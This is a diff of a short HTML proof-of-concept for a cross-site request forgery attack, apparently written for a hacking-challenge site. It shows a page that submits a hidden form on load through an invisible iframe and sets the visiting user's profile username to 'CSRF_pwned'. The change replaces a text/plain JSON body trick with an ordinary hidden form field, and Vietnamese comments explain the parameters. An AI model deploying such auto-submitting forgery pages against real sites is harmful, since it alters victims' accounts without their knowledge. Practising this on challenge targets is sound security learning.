@@ -1,10 +1,10 @@
 <!doctype html>
 <html>
 <body onload="document.forms[0].submit()">
+  <!-- Đổi giá trị username tùy ý -->
   <form action="https://hackingchallenge.spsglobal.com/profile"
-        method="POST" enctype="text/plain" target="sink">
-    <!-- name là cả chuỗi JSON; value để trống để body == JSON -->
-    <input name='{"username":"CSRF_pwned"}' value="">
+        method="POST" target="sink">
+    <input type="hidden" name="username" value="CSRF_pwned">
   </form>
   <iframe name="sink" style="display:none"></iframe>
 </body>
